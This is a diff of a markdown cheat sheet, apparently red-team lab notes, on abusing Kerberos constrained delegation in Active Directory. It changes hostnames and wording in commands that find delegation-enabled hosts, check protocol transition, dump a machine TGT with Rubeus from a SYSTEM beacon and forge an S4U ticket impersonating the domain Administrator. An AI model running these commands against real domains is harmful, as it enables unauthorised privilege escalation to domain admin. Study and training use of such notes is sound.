@@ -36,13 +36,14 @@ Search for computers with Constrained Delegation (`msDS-AllowedToDelegateTo` not
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
 ```
 
-Check the UAC value to see if protocol transitioning is possible (we want true)
+Check the UAC value to see if protocol transitioning is possible 
 ```powershell
-ldapsearch (&(samAccountType=805306369)(samaccountname=LON-WS-1$)) --attributes userAccountControl
+ldapsearch (&(samAccountType=805306369)(samaccountname=LON-WKSTN-1$)) --attributes userAccountControl
 ```
 
+We want true
 ```powershell
-[Convert]::ToBoolean([UAC_Value] -band 16777216)
+[Convert]::ToBoolean(16781312 -band 16777216)
 ```
 
 Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the computer account
@@ -50,9 +51,9 @@ Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the comp
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
 ```
 
-Perform the S4U abuse to obtain a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain admin.
+Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value, impersonating the default domain admin.
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /impersonateuser:Administrator /nowrap /ticket:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
 ```
 
  Inject the ticket into a sacrificial logon session.
